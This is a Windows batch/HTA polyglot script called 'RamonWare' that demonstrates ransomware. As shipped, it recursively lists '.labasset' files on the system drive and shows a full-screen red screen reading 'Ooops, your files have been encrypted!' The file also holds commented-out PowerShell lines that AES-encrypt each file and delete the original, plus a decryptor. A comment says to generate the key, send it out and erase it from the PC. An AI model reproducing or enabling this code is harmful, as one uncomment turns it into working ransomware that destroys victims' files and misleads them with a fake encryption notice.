<!-- :: Batch Section
@Echo OFF
mode con:cols=50 lines=2

Title RamonWare

echo Scanning. . . .

REM Scan only: list matching files. Nothing is encrypted or deleted.
set ROOT_PATH=%homedrive%\
FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
    echo %%X >> %homedrive%\Original.txt
    REM Uncomment to AES-encrypt each file and delete the original.
    REM Generate %pass% here, send it out, then erase it from this PC.
    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $a.GenerateIV(); $b=[IO.File]::ReadAllBytes('%%X'); [IO.File]::WriteAllBytes('%%X.aes',$a.IV+$a.CreateEncryptor().TransformFinalBlock($b,0,$b.Length))"
    REM del "%%X"
    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $d=[IO.File]::ReadAllBytes('%%X.aes'); $a.IV=[byte[]]($d[0..15]); [IO.File]::WriteAllBytes('%%X',$a.CreateDecryptor().TransformFinalBlock($d,16,$d.Length-16))"
)

cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
<head>
    <title>RamonWare</title>
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <hta:application id="ramonWare"
                     applicationname="RamonWare"
                     version="1.0"
                     maximizebutton="no"
                     minimizebutton="no"
                     sysmenu="no"
                     caption="no"
                     windowstate="maximize"/>
    <style>
        html, body {
            margin: 0;
            height: 100%;
            overflow: hidden;
            background: #8c1d1d;
            color: #fff;
            font: 16px "Lucida Console", monospace;
        }
        #title {
            text-align: center;
            letter-spacing: 1px;
        }
        #message {
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body>
    <p id="title"> - RamonWare - </p>
    <div id="message">
        Ooops, your files have been encrypted!<br><br><br>
        Github.com/SegoCode<br>
    </div>
</body>
</html>
